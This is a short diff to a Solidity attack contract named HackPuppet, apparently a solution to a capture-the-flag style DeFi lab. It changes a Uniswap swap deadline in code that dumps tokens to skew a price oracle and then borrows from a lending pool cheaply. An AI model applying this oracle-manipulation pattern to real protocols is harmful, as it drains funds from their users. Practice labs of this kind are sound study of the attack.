@@ -27,7 +27,7 @@ contract HackPuppet {
         // swap DVT for ETH
         uint256 amountToSwap = token.balanceOf(address(this));
         token.approve(address(uniswap), amountToSwap);
-        uniswap.tokenToEthSwapInput(amountToSwap, 1, block.timestamp + 5000);
+        uniswap.tokenToEthSwapInput(amountToSwap, 1, block.timestamp);
 
         // borrow DVT from pool
         uint256 amountToBorrow = token.balanceOf(address(pool));
